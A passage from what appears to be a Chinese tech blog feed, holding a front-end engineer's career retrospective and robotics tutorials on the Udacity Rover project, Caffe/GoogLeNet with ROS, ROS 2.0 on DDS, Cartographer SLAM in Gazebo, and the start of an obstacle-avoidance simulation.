教學是少數我能維持動能並堅持下去的事，雖然是兼職教學，但我自認課程品質不會跟那些全職教學的差到太遠，以一人團隊來說，我覺得做得不錯了。但當然我也不會就停在這裡，畢竟我認為課程永遠都有改善的空間。
教學相關的心得等課程結業後會再寫一篇文，這邊就先簡單帶過了，不然我怕這篇文會變得太長。
溝通一年前剛接 Front-end Team Lead 的職位時其實戰戰兢兢，那時候主管只是問我有沒有興趣慢慢來試試看，我說可以慢慢試試看，下禮拜我就被拉到這職位了。我原本以為會先跟在主管旁邊見習一下之類的，結果完全沒有。
不過雖然說是 Team Lead，其實更像是 Lead engineer。差異在於前者會更偏向管理職要帶人，後者則是著重在技術面。我覺得以工作內容來說，其實後者更為貼近一點。
我要做的事情就是跟 PM 溝通，每兩週開一次 sprint planning meeting 看要放什麼 ticket 進來。有新的功能時要給 PM 一個大概的時間估計，也要把 ticket 分發給其他同事，決定他們要做哪些事情。
簡單來說我一個人對 PM，其他前端工程師則是負責去解那些 ticket。不過我自己也是要寫 code 啦，但有一部分時間要留給跟 PM 溝通，只要前端有任何問題他們就是找我，我自己認為大概 8 成時間還是寫 code，其他 2 成處理跟專案有關的事情，簡單來說就是要一直溝通。
以前其實就知道自己溝通能力並不差，但這次會覺得緊張是因為要用英文溝通…剛進公司的時候英文能力頗差（現在也沒多好），深怕自己只會一直跳針說：「Sorry, can you repeat again?」。
起初的時候還真的有點溝通問題，但接了這個位子兩三個月以後發現開始慢慢習慣了，開會的時候超級無敵專心聽雖然還是有些單字聽不懂，但一樣抓關鍵字就好了，聽懂七八成基本上就能夠溝通的滿順暢。
除了這個以外，最近幾個月也開始當起面試官。我一直覺得面試對公司來說是一件需要非常注重的事，因為就是公司對外的門面，一場糟糕的面試比一頓難吃的晚餐更為不堪。
對於面試我也還在摸索自己怎樣能夠做得更好，但我謹記前輩說的話，他說面試不是要比誰厲害，而是要去看面試者的優點，去看他是否適合這個位置，是否想要與他共事。如果面試只是想要電人來凸顯自己的優越，那就完全失去意義了。
順帶一提，有些人的履歷真的寫得很不怎麼樣，十年工作經驗卻看不出到底做了什麼事。
所以，我是資深工程師嗎？好，回顧了這麼多終於回到了標題。
兩年前那篇我提到了這篇很棒的文章：如何才有資格稱為資深工程師，裡面提供了一些指標可以參考，更貼心地提供了反指標讓大家知道走火入魔是什麼樣子。
經過這兩年的磨練，在前公司獨立完成直播網站的開發，也在此期間加深自己對基礎的理解，對開發新功能的理解從：「不知道自己能否做到」轉變為「做得到，可能需要多少時間」，在自信心上面提昇了不少。
在現在的公司也終於有了更多討論與交流的機會，跟另外兩位前端討論要選哪個 library、coding style 怎麼定、檔案命名規則怎麼定等等，也更頻繁地與 PM 交流，對溝通以及專案管理有了進一步的理解。
這一年來負責公司的四個前端專案，對專案的架構或是使用的技術上也有了不同的理解，做不同的專案的時候都可以觀摩一下別人寫的架構跟程式碼，培養了看到爛 code 就會想順手修掉的習慣，對於重構之前看到有人說了一句很棒的話：「很多工程師都只會重建，而不會重構」，重構應該是漸進的，如果想等到有時間再砍掉重練，那永遠等不到。
應該做的是在修 bug 或是寫新功能時就順手修掉一些，例如說今天改一個購買流程的東西，我就會順手把那部分重構一下，不一定要做到你心中完美的樣子，只要確保比以前的程式碼品質更好就行了，這樣就會越來越好。
而工作以外的時間寫寫 Blog 分享心得，偶爾花個六七小時只為了寫一篇技術文章，大部分的時間則花在教學培訓，成功轉職的學生也印證了課綱的價值，透過教學也把自己的基礎打得更紮實了一點。
兩年前，工作經驗一年半，剛進入第二家公司任職，自認程式寫得不差但基礎不好，經驗也不足，配不上資深這個名字，因此以資淺工程師自稱。
兩年過後，我可以把前端出現的各種工具放到脈絡裡去談，去解釋為什麼會出現，解釋帶來的好處是什麼，也可以說明在專案中應該如何使用；對前端工程師的必備技能也有一定的基礎，可以跟你談 JavaScript 的各種奇怪現象，要談網路談瀏覽器也行；對 PM 提出的需求通常不會擔心做不做得出來，因為知道自己一定行，關注的點反而變成要如何實作才能做的漂亮以及完成所需要的時間；知道工程師除了寫程式以外，還有很多重要的事情要做，像是理解需求、溝通以及思考。
是的，我覺得我是資深工程師了。
認同請按讚，喜歡請分享（開玩笑的）。
接下來呢？當你懂的愈多，也會愈知道自己不足的地方在哪裡，還有很多需要磨練的地方，就算是資深工程師，也有 90 分與 60 分的差異，學無止盡，要學的東西還多著，下面整理出幾個我想加強的方向：
第一，JavaScript 我有一定的基礎但還不夠穩，我希望能把這塊再練的穩一點，希望能穩到看任何 JavaScript 相關的文章都很難感到驚訝的程度。
第二，我在測試這方面弱到爆炸，只有 unit test 的經驗，React 裡面要對 component 做測試的話我還是不知道要測什麼，對 end-to-end testing 也沒什麼經驗。我認為測試是邁向下個階段很重要的關鍵，它可以改變你看程式碼的角度，並且讓品質變得更好。
第三，對使用的工具理解還可以再更深一點，希望能花些時間去研究 Vue、React 跟 Redux 的原始碼，去看一下他們是怎麼做的，除此之外，也能夠從裡面學到很多架構與設計方面的知識。
第四，對於一些「基礎」的理解不足，我這邊指的是瀏覽器跟網路。我大概看過瀏覽器渲染的過程，但我覺得對其中的各個環節還不夠理解，網路的話希望能把 HTTP、HTTP2 或是 TCP&#x2F;IP 這些東西看熟一點。
第五，computer science 的基礎不足，例如作業系統跟計算機組織還有演算法與資料結構，如果想要再往上，這些也是很重要的一部分，想學習的話比較有效的方式應該是直接去找大學開的課程來看，幫助應該滿大。
技術是工程師的根本，不能忘記這點，也千萬不能讓自己的技術荒廢。是因為有了技術能力，我才能走到現在這個位置。
總結很慶幸自己在兩年前有寫了那篇文章，幫自己做了一個很好的總結，正是因為有把當時的心得留下來，現在才能夠對照自己以前的樣子。
重看了一遍兩年前的那篇回顧，發現自己在觀念上還是差不多的，還是很注重分享，所以這兩年之間從未間斷。對於「痛過才能理解」還是抱持著一樣的想法，也把這些概念變成文章記錄起來，不然每提到一次就要重新再講一次，很不符合工程師的性格，能重構就應該儘早重構。對於廣度與深度的看法，支持先廣再深，因為那樣走過來的我覺得很有幫助；而小公司與大公司的問題，現在還沒進過大公司所以無法體會，可能要再過好一陣子才能跟大家分享這塊的心得。
其實每次在寫這種回顧的時候，都會先感嘆一下時間就這樣過去了，完全沒有意識到已經過了兩年；不過也就是因為這樣，會更讓人期待自己下一次會變成什麼樣子。
就這樣啦，我們兩年後再見！
如果看完有心得想要留言，歡迎直接到 GitHub 下面去留言，因為在這底下留言的話我收不到通知，GitHub 的話會比較好交流。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Udacity RoboND - Rover project 簡介</title>
    <url>/2017/08/26/robond-rover/</url>
    <content><![CDATA[前言最近 Udacity 的 nano degree 算是滿紅的，他們也有把很多教學資源放到 github 上面，例如 Rover project，我覺得拿來上手還不錯，以下就稍微來簡介一下這個 project 有趣的地方。
Project 簡介
這個 project 是要讓 Rover 在世界中自由自在地行走，然後尋找特定的岩石樣本並收集，因為他們將岩石的顏色設計得跟背景很不一樣，所以我們只要可以在環境中走來走去，然後一直尋找畫面中有沒有黃黃的、像是黃金的石頭就好了：

對收到的影像做處理，得到可以走的區塊首先，機器人要知道哪邊可以走、哪邊不能走，所以在收到 camera 的影像後，要先處理一下，濾出可以走的區塊，
import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npimage_name = &#x27;sample.jpg&#x27;image = mpimg.imread(image_name)# 因為可以走的區塊是白色的，使出color threshold大法def color_thresh(img, rgb_thresh=(0, 0, 0)):	color_select = np.zeros_like(img[:,:,0])	above_thresh = (img[:,:,0] &gt; rgb_thresh[0]) \				   &amp; (img[:,:,1] &gt; rgb_thresh[1]) \	&amp; (img[:,:,2] &gt; rgb_thresh[2])	color_select[above_thresh] = 1	return color_select	red_threshold = 150	green_threshold = 150	blue_threshold = 150	rgb_threshold = (red_threshold, green_threshold, blue_threshold)# pixels below the thresholdscolorsel = color_thresh(image, rgb_thresh=rgb_threshold)# Display the original image and binaryf, (ax1, ax2) = plt.subplots(1, 2, figsize=(21, 7), sharey=True)f.tight_layout()ax1.imshow(image)ax1.set_title(&#x27;Original Image&#x27;, fontsize=40)ax2.imshow(colorsel, cmap=&#x27;gray&#x27;)ax2.set_title(&#x27;Your Result&#x27;, fontsize=40)plt.subplots_adjust(left=0., right=1, top=0.9, bottom=0.)plt.show()

這樣就可以畫出結果了:

產生地圖雖然我們從影像中，得知了目前可以走的區塊，但隨著機器人一直走來走去，就會得到一張張的影像，每張裡面都有可以走的區塊。如果可以把這一張張的影像接起來，變成地圖，那事情就會方便許多！所以我們可以透過 perspective transform 將影像變成從俯視的 view 觀看，然後再將影像轉換到以 Rover 為中心的坐標系就可以了。
import numpy as npimport cv2import matplotlib.image as mpimgdef perspect_transform(img, src, dst):# Get transform matrix using cv2.getPerspectivTransform()	M = cv2.getPerspectiveTransform(src, dst)# Warp image using cv2.warpPerspective()# keep same size as input imagewarped = cv2.warpPerspective(img, M, (img.shape[1], img.shape[0]))# Return the resultreturn warpeddef color_thresh(img, rgb_thresh=(160, 160, 160)):# Create an array of zeros same xy size as img, but single channel	color_select = np.zeros_like(img[:,:,0])# Require that each pixel be above all thre threshold values in RGB# above_thresh will now contain a boolean array with &quot;True&quot;# where threshold was metabove_thresh = (img[:,:,0] &gt; rgb_thresh[0]) \			   &amp; (img[:,:,1] &gt; rgb_thresh[1]) \			   &amp; (img[:,:,2] &gt; rgb_thresh[2])# Index the array of zeros with the boolean array and set to 1			   color_select[above_thresh] = 1# Return the binary image			   return color_select			   image = mpimg.imread(&#x27;sample.jpg&#x27;)			   dst_size = 5			   bottom_offset = 6# 這邊的定義是要給 perspective transform 用的，先定義原圖中的某些點，再定義想要扭成某個形狀的圖中那些點的位置			   source = np.float32([[14, 140], [301 ,140],[200, 96], [118, 96]])destination = np.float32([[image.shape[1]/2 - dst_size, image.shape[0] - bottom_offset],		[image.shape[1]/2 + dst_size, image.shape[0] - bottom_offset],		[image.shape[1]/2 + dst_size, image.shape[0] - 2*dst_size - bottom_offset],		[image.shape[1]/2 - dst_size, image.shape[0] - 2*dst_size - bottom_offset],		])

import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npimport cv2from extra_functions import perspect_transform, color_thresh, source, destinationimage = mpimg.imread(&#x27;sample.jpg&#x27;)# 轉換到以 Rover 為中心的座標系def rover_coords(binary_img):	y_pos, x_pos = binary_img.nonzero()	x_pixel = -(y_pos - binary_img.shape[0])	y_pixel = -(x_pos - binary_img.shape[1]/2 )	return x_pixel, y_pixel# Perform warping and color thresholding	warped = perspect_transform(image, source, destination)colorsel = color_thresh(warped, rgb_thresh=(160, 160, 160))xpix, ypix = rover_coords(colorsel)# Plot the map in rover-centric coordsfig = plt.figure(figsize=(5, 7.5))plt.plot(xpix, ypix, &#x27;.&#x27;)plt.ylim(-160, 160)plt.xlim(0, 160)plt.title(&#x27;Rover-Centric Map&#x27;, fontsize=20)

綜合起來，就可以得到

根據地圖產生新的移動方向假設已經有了地圖，下一步就是希望得到要走的方向，最簡單的想法就是挑可以走的範圍的中線，因為離障礙物最遠。但我們前面的表示法，是把每個 pixel 用 (x,y) 這種笛卡爾坐標系下的定義來儲存位置，即便我們有這些可行走區域的 (x,y) 位置，要從這些 (x,y) pair 中找出中線還是頗麻煩的。
所以這邊就會用到小時候學過的極座標啦，大家可以想一想，如果我們有每一個可走區域的 pixel 的極座標，那是不是把每一個點的角度都平均一下，就可以得到要行走的角度了呢？
根據上面的觀念，我們就再寫一下從笛卡爾座標轉換成極座標的 function：
import matplotlib.pyplot as pltimport matplotlib.image as mpimgimport numpy as npfrom extra_functions import perspect_transform, color_thresh, rover_coords# 只要定義一個將pixel從笛卡爾座標轉成極座標的function就好def to_polar_coords(xpix, ypix):	dist = np.sqrt(xpix**2 + ypix**2)	angles = np.arctan2(ypix, xpix)	return dist, angles	image = mpimg.imread(&#x27;angle_example.jpg&#x27;)	warped = perspect_transform(image) # Perform perspective transform	colorsel = color_thresh(warped, rgb_thresh=(160, 160, 160)) # Threshold the warped image	xpix, ypix = rover_coords(colorsel) # Convert to rover-centric coords	distances, angles = to_polar_coords(xpix, ypix) # Convert to polar coords	avg_angle = np.mean(angles) # Compute the average angle# Plot	fig = plt.figure(figsize=(12,9))plt.subplot(221)plt.imshow(image)plt.subplot(222)plt.imshow(warped)plt.subplot(223)plt.imshow(colorsel, cmap=&#x27;gray&#x27;)plt.subplot(224)plt.plot(xpix, ypix, &#x27;.&#x27;)plt.ylim(-160, 160)plt.xlim(0, 160)arrow_length = 100x_arrow = arrow_length * np.cos(avg_angle)y_arrow = arrow_length * np.sin(avg_angle)plt.arrow(0, 0, x_arrow, y_arrow, color=&#x27;red&#x27;, zorder=2, head_width=10, width=2)plt.show()

就可以畫出下圖:

總結今天跟大家簡單介紹了一下 Udacity 的學習資源，也簡介了一點點 Rover project 的內容，我自己覺得他們的 project 設計都還不錯，值得玩一玩，適合想要入門的讀者參考。
延伸閱讀
RoboND Kinematics Project
RoboND Perception Project

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>robot, navigation, rover,</tag>
      </tags>
  </entry>
  <entry>
    <title>Caffe &amp; GoogLeNet，怎麼幫助機器人更好地辨識物體</title>
    <url>/2016/03/19/ros-caffe/</url>
    <content><![CDATA[簡介這次要談的內容，是使用深度學習(Deep Learing)的模型來讓機器人做物體辨識。深度學習在這幾年來變得很火紅，相關的框架也相當多，這次之所以想談caffe，是因為已經有現成的方法可以將它應用到機器人上面。（有位台灣的開發者弄了一個叫做ros_caffe的package來串接ROS(機器人作業系統)跟Caffe，可以將Caffe辨識的結果丟到一個ROS的topic，其他的node就可以自己取用。這使得機器人辨識物體的能力得以大幅增加）
一點點幫助入門的細節基本的安裝方法可以參考這個連結，假設已經裝成功，那至少就已經有基本的環境可以用(有一個caffe的資料夾被放在你安裝的路徑)，接下來需要下載GoogLeNet的model，只要用caffe&#x2F;scripts資料夾裡的程式幫忙就行了:
$./scripts/download_model_binary.py ./models/bvlc_googlenet
上面這個指令會將GoogLeNet的model下載到caffe&#x2F;models&#x2F;bvlc_googlenet，假設已經下載好model，接下來就可以用一個小程式來跑跑看GoogLeNet了:
import numpy as npimport matplotlib.pyplot as plt 	# Make sure that caffe is on the python path:caffe_root = &#x27;../&#x27; # this file is expected to be in &#123;caffe_root&#125;/examplesimport syssys.path.insert(0, caffe_root + &#x27;python&#x27;)sys.path.append(&amp;quot;/usr/lib/python2.7/dist-packages/&amp;quot;) import caffe# Set the right path to your model definition file, pretrained model weights,# and the image you would like to classify.MODEL_FILE = &#x27;../models/bvlc_googlenet/deploy.prototxt&#x27;PRETRAINED = &#x27;../models/bvlc_googlenet/bvlc_googlenet.caffemodel&#x27;IMAGE_FILE = &#x27;images/cat.jpg&#x27; caffe.set_mode_cpu()net = caffe.Classifier(MODEL_FILE, PRETRAINED,mean=np.load(caffe_root + &#x27;python/caffe/imagenet/ilsvrc_2012_mean.npy&#x27;).mean(1).mean(1),channel_swap=(2,1,0),raw_scale=255,image_dims=(256, 256)) input_image = caffe.io.load_image(IMAGE_FILE)plt.imshow(input_image)plt.show() prediction = net.predict([input_image])plt.plot(prediction[0])plt.show()print &#x27;predicted class:&#x27;, prediction[0].argmax()

接下來只要執行(因為程式放在examples資料夾底下):
$python ./examples/googlenet_example.py
就可以看到一隻貓的影像，關掉影像之後就會看到貓的類別:

串接ros_caffe如果想往下跟ros_caffe的串接可以參考外國鄉民的文章，裡面有完整而詳細的步驟。如果你已經安裝過caffe，可以參考這個issue。
需要注意的是，外國鄉民跑的只有global的結果，也就是一張影像中只有一個最顯著的物體會被辨識，如果要辨識一張影像中的各個物體，可能就要自己在中間串接一個負責做segmentation的node，再把各個切出來的區塊餵給ros_caffe來做辨識。
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, 深度學習, Deep Learing, Robot, GoogLeNet, Caffe</tag>
      </tags>
  </entry>
  <entry>
    <title>用 DDS 開發 ROS 2.0</title>
    <url>/2016/04/15/ros-2-dds/</url>
    <content><![CDATA[前言這篇文章想要向大家介紹ROS 2.0的底層實作概念，雖然比較不會有程式實作的討論，但我覺得這一塊的深度滿值得介紹的，因為使用ROS有好幾種層次:

使用ROS的各種工具來建立自己的應用
在開發上碰到一些問題，修改現成的package來滿足自己的需求
開發自己的演算法，發布自己的package給其他人使用
協助開發與維護ROS的核心

這篇文章要討論的議題已經落在第四個層次，所以對於一般的使用者來說，可能不太具有直接應用的價值，但如果對於ROS的底層實作有更深入的理解(知道他是怎麼開發出來的、有哪些限制、有哪些優點)，就可以在利用ROS撰寫自己的應用時，更能開發出效能最佳化的應用。
為什麼要開發ROS 2.0?事實上，如果ROS 1.0 已經足夠完美，那我們就沒有必要討論ROS 2.0。不過事情當然不是這樣，因為ROS 1.0在開發的時候，是圍繞著一隻機器人來開發的，雖然當初的設計已經讓ROS變得很有彈性，可以被應用在各式各樣的機器人上，但是隨著使用者越來越多，超乎開發者想像的使用情境也越來越多。
也就是說，如果開發者們不積極地開始開發下一代的ROS，遲早會無法滿足越來越複雜而多樣化的需求。對於這些使用情境的具體描述，可以參考這裡。
開發ROS系統需要實現的模塊首先來談論一下建立整個系統上，需要考慮的幾個重點:

Discovery功能
Publisher-Subscriber功能
Service 與 Action功能

Discovery功能的意義是，只要有新的node啟動，就能在整個ROS node的網路中被看見(概念很像是我打開手機的wifi熱點分享，其他裝置就應該要可以發現有這個wifi熱點)。
接下來的Publisher-Subscriber功能、Service功能跟Action功能其實就是ROS使用者熟悉的Topic、Service跟Actionlib啦，本質上這幾種功能在處理的都是node之間的溝通(也就是程式之間的溝通，大家可以想像要讓一隻機器人正常運作，電腦上需要運行的程式一定是很多個，而且需要彼此溝通，所以底層的溝通機制需要有人來實作，不然就是…想開發機器人程式的你得自己實作)。如果你不太確定自己知不知道我在說什麼，可以看看這一篇區分Topic、Service跟Actionlib的文章。
DDS的系統層概念想要實作上面這些功能，DDS並不是唯一的選擇，但是，OSRF(Open Source Robotic Foundation)的開發者經過嘗試之後，覺得這是最好的開發選項。細節理由可以看延伸閱讀的第3篇文章，這部分已經有中文翻譯了。

從上面這張圖可以清楚地看出，使用者所需要接觸到的只有最上面的兩層。使用者自己寫的code就屬於Userland Code，而使用者自己寫的code中呼叫到的ROS API (例如ros::init())就屬於ROS client library API，而DDS的API則是在更底層被ROS client library API所使用。
有趣的地方是，為了保持彈性，OSRF的開發者們希望使用者可以自己選擇底層使用的是哪一個版本的DDS (DDS像是一種標準，所以可以有不同公司提供自己的實作版本)。
一點細節的延伸上面討論的都是概念的理解，對於技術有興趣的你想必沒辦法接受，所以就讓我們來看一點技術細節吧!
我們還是一樣先站在開發者的角度，最基本我們需要提供的工具就是Node初始化的函式對吧，這個函式的長相就像:
Node::Node(std::string name): running_(true)&#123;	/*----------------------親切的中文註解來囉!!!----------------------*/	nodes_.push_back(this);	subscription_iterator_ = subscriptions_.end();	name_ = name;	//取得了DDS的DomainParticipantFactory的instance，很像是一個node產生器的感覺	dpf_ = DDS::DomainParticipantFactory::get_instance();	checkHandle(dpf_.in(), &quot;DDS::DomainParticipantFactory::get_instance&quot;);	DDS::DomainId_t domain = DDS::DOMAIN_ID_DEFAULT; 	//實際產生一個participant，應該就是一個node	participant_ = create_participant( domain, PARTICIPANT_QOS_DEFAULT, NULL,DDS::STATUS_MASK_NONE);	checkHandle(participant_.in(), &quot;DDS::DomainParticipantFactory::create_participant&quot;);	/*----------------------看到這裡就好囉!!!----------------------*/ 	// Create the default QoS for Topics	DDS::ReturnCode_t status = participant_get_default_topic_qos(default_topic_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_topic_qos&quot;);	default_topic_qos_.reliability.kind = DDS::BEST_EFFORT_RELIABILITY_QOS; 	// Create the default QoS for Publishers	status = participant_get_default_publisher_qos(default_publisher_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_publisher_qos&quot;);	default_publisher_qos_.partition.name.length(1);	default_publisher_qos_.partition.name[0] = &quot;ros_partition&quot;; 	// Create the default QoS for Subscribers	status = participant_get_default_subscriber_qos(default_subscriber_qos_);	checkStatus(status, &quot;DDS::DomainParticipant::get_default_publisher_qos&quot;);	default_subscriber_qos_.partition.name.length(1);	default_subscriber_qos_.partition.name[0] = &quot;ros_partition&quot;; 	// Create a waitset for spin	waitset_ = new DDS::WaitSet();	// Create a parameter server for this node	create_parameter_server(name);&#125;

大家先不要嚇到，一下有太多細節本來就不可能看懂，大家只需要看我用註解標記起來的區域，體驗一下什麼叫做ROS client library API呼叫DDS API的感覺就好。
那對於一個使用者來說，假設我今天要啟動一隻機器人，那就需要呼叫建立node的函式，看起來就像:
TurtleApp(int&amp; argc, char** argv): QApplication(argc, argv)&#123;	rclcpp::init(argc, argv);	nh_ = rclcpp::create_node(&quot;turtlesim&quot;);&#125;

你一定覺得奇怪，rclcpp::create_node()跟上面我講的Node::Node()建構子根本接不起來啊? 所以這邊就要補上一點點程式碼，想必你就懂了:
void rclcpp::init(int argc, char** argv)&#123;	if (globally_initialized)	&#123;		throw AlreadyInitializedError();	&#125;		/* Register a signal handler so DDS doesn not just sit there... */	if (signal(SIGINT, Node::static_signal_handler) == SIG_ERR)	&#123;		fputs(&quot;An error occurred while setting a signal handler.\n&quot;, stderr);	&#125;	globally_initialized = true;&#125; Node::Ptr rclcpp::create_node(const std::string &amp;name)&#123;	return Node::Ptr(new Node(name));&#125;

總結OK!簡介就到這邊啦，如果對於實作細節有興趣深入的讀者，不妨去看看ROS 2.0的github repo，詳細的程式碼全部都是開源的，所以可以從中學習開發的細節。
延伸閱讀
為什麼要開發ROS 2.0?
使用ZeroMQ跟相關的函式庫來開發ROS
使用DDS來開發ROS (仍在趕工中，歡迎開issue催促翻譯者QQ)
ROS 2.0 wiki
ROS DDS Prototype (Github Repo)

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, Robot, ROS, DDS</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Google Cartographer SLAM 演算法來建地圖</title>
    <url>/2016/10/29/ros-cartographer-slam-basic/</url>
    <content><![CDATA[前言Cartographer 是 Google 最近剛發表的 SLAM 演算法，效果看起來非常好，而且他們發表的論文裡主打這個演算法很 real-time，今天就來帶大家把這個演算法在自己的環境中跑起來，之後就可以自己玩了。

建立模擬環境我的測試環境是 Ubuntu 14.04 + ROS Indigo，不過使用的指令都很 general，即便你使用其他版本，應該也不會有什麼問題。
首先我們確定已經安裝所需要的套件：
sudo apt-get install ros-indigo-gazebo-*

接下來在終端機輸入 gazebo 應該就可以成功啟動 Gazebo 模擬器。然後我們可以用現成的 package 啟動一個有 PR2 的複雜環境。
roslaunch pr2_gazebo pr2_wg_world.launch

理論上，你會碰到一個 error 說：
unused args [paused, gui] for include of [/opt/ros/jade/share/gazebo_ros/launch/willowgarage_world.launch] The traceback for the exception was written to the log file

這時候只要去編輯你的 pr2_wg_world.launch，把有 arg 的部分註解掉就好，註解完的檔案看起來會像下面這樣：
&lt;launch&gt;  &lt;!-- start up empty world --&gt;  &lt;!-- &lt;arg name=&quot;gui&quot; default=&quot;true&quot;/&gt;  &lt;arg name=&quot;paused&quot; default=&quot;true&quot;/&gt; --&gt;  &lt;!-- TODO: throttled not implemented in gazebo_ros/empty_world.launch  &lt;arg name=&quot;throttled&quot; default=&quot;false&quot;/&gt;  --&gt;  &lt;include file=&quot;$(find gazebo_ros)/launch/willowgarage_world.launch&quot;&gt;    &lt;!-- &lt;arg name=&quot;gui&quot; value=&quot;$(arg gui)&quot; /&gt;    &lt;arg name=&quot;paused&quot; value=&quot;$(arg paused)&quot; /&gt; --&gt;    &lt;!-- TODO: throttled not implemented in gazebo_ros/empty_world.launch    &lt;arg name=&quot;throttled&quot; value=&quot;$(arg throttled)&quot; /&gt;    --&gt;  &lt;/include&gt;  &lt;!-- start pr2 robot --&gt;  &lt;include file=&quot;$(find pr2_gazebo)/launch/pr2.launch&quot;/&gt;&lt;/launch&gt;

註解完畢就可以啟動啦。啟動之後的環境會長得像下面這樣：


安裝 &amp; 啓動 Cartographer安裝的方法滿簡單的，只要照著官方文件上的步驟做就可以了：
# Install wstool and rosdep.sudo apt-get updatesudo apt-get install -y python-wstool python-rosdep ninja-build# Create a new workspace in &#x27;catkin_ws&#x27;.mkdir catkin_wscd catkin_wswstool init src# Merge the cartographer_ros.rosinstall file and fetch code for dependencies.wstool merge -t src https://raw.githubusercontent.com/googlecartographer/cartographer_ros/master/cartographer_ros.rosinstallwstool update -t src# Install deb dependencies.rosdep initrosdep updaterosdep install --from-paths src --ignore-src --rosdistro=$&#123;ROS_DISTRO&#125; -y# Build and install.catkin_make_isolated --install --use-ninjasource install_isolated/setup.bash

重點是裝完之後，我們想要跑 cartographer_ros package 裡面的 demo_pr2.launch，但裡面原本預設是跑 bag file 的 demo 版本，所以我們要稍微修改一下 demo_pr2.launch ：
rosed cartographer_ros demo_pr2.launch

&lt;!--  Copyright 2016 The Cartographer Authors  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);  you may not use this file except in compliance with the License.  You may obtain a copy of the License at       http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.--&gt;&lt;launch&gt;  &lt;param name=&quot;/use_sim_time&quot; value=&quot;true&quot; /&gt;  &lt;node name=&quot;cartographer_node&quot; pkg=&quot;cartographer_ros&quot;      type=&quot;cartographer_node&quot; args=&quot;          -configuration_directory              $(find cartographer_ros)/configuration_files          -configuration_basename pr2.lua&quot;      output=&quot;screen&quot;&gt;    &lt;remap from=&quot;scan&quot; to=&quot;/base_scan&quot; /&gt;  &lt;/node&gt;  &lt;node name=&quot;tf_remove_frames&quot; pkg=&quot;cartographer_ros&quot;      type=&quot;tf_remove_frames.py&quot;&gt;    &lt;remap from=&quot;tf_out&quot; to=&quot;/tf&quot; /&gt;    &lt;rosparam param=&quot;remove_frames&quot;&gt;      - map      - odom_combined    &lt;/rosparam&gt;  &lt;/node&gt;  &lt;node name=&quot;rviz&quot; pkg=&quot;rviz&quot; type=&quot;rviz&quot; required=&quot;true&quot;      args=&quot;-d $(find cartographer_ros)/configuration_files/demo_2d.rviz&quot; /&gt;&lt;/launch&gt;

修改完之後就可以執行了，這時應該可以看到 Rviz 的視窗跳出來，也可以看到目前的地圖。
roslaunch cartographer_ros demo_pr2.launch

Teleop PR2 來建地圖囉只要啟動 teleop_keyborad 就可以用鍵盤控制機器人移動：
roslaunch pr2_teleop teleop_keyboard.launch

WASD 四個按鍵分別代表前左後右四個方向的平移、QE兩個按鍵是原地旋轉，這邊要注意必須選到啟動 teleop_keyboard的視窗，按按鍵才有用。使用 teleop 來控制 PR2 走一走之後，就可以看得出我們已經建立了一個有模有樣的地圖。不過因為這個地圖太大，我就不走完了。

總結今天主要帶大家把 Cartographer 跑起來，把原本 demo 用的版本換成可以接上自己的機器人，有興趣深入研究的讀者可以搭配論文，有了可以玩的環境和程式碼可以參考，學習起來會比較有感。
延伸閱讀
Cartographer論文

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>機器人, Robot, ROS, Gazebo, Cartographer, SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 ROS 與 Gazebo 模擬一個自動避障機器人</title>
    <url>/2016/09/28/ros-collision-avoiding-robot/</url>
    <content><![CDATA[前言機器人要在環境中隨心所欲移動，需要的最基礎功能之一就是避障。要能夠避障的首要條件是要有感測器接收環境中的資訊，才能藉由這個資訊判斷障礙物是否存在。
常見的感測器包含紅外線感測器、超音波感測器、雷射測距儀、一般的相機、RGB-D 感測器等等，底層的感測器 driver 不在這篇文章的討論範圍裡，我們先單純看看怎麼使用收到的 laser data 來避障。
建立模擬環境我們先用 Gazebo 建立一個簡單的環境，加上幾個障礙物，就可以把這個 world 存起來了 (這邊先叫做 simple_wall.world )。接下來我們要寫一個 launch 檔，在啟動 Gazebo 的時候就載入剛剛存的 world，加入一隻 Turtlebot，並讓這隻 Turtlebot 有一顆模擬的雷射測距儀。相關的檔案都可以在這邊找到。
而上面提到的這些東西都可以用一個 launch 檔搞定：
&lt;launch&gt;  &lt;param name=&quot;robot_description&quot; command=&quot;$(find xacro)/xacro.py &#x27;$(find turtlebot_description)/robots/kobuki_hexagons_kinect.urdf.xacro&#x27;&quot; /&gt;  &lt;arg name=&quot;world_file&quot;  default=&quot;$(find assignment_3)/world/simple_wall.world&quot;/&gt;  &lt;arg name=&quot;base&quot;      value=&quot;$(optenv TURTLEBOT_BASE kobuki)&quot;/&gt; &lt;!-- create, roomba --&gt;  &lt;arg name=&quot;battery&quot;   value=&quot;$(optenv TURTLEBOT_BATTERY /proc/acpi/battery/BAT0)&quot;/&gt;  &lt;!-- /proc/acpi/battery/BAT0 --&gt;   &lt;arg name=&quot;gui&quot; default=&quot;true&quot;/&gt;  &lt;arg name=&quot;stacks&quot;    value=&quot;$(optenv TURTLEBOT_STACKS hexagons)&quot;/&gt;  &lt;!-- circles, hexagons --&gt;   &lt;arg name=&quot;3d_sensor&quot; value=&quot;$(optenv TURTLEBOT_3D_SENSOR kinect)&quot;/&gt;  &lt;!-- kinect, asus_xtion_pro --&gt;   &lt;include file=&quot;$(find gazebo_ros)/launch/empty_world.launch&quot;&gt;    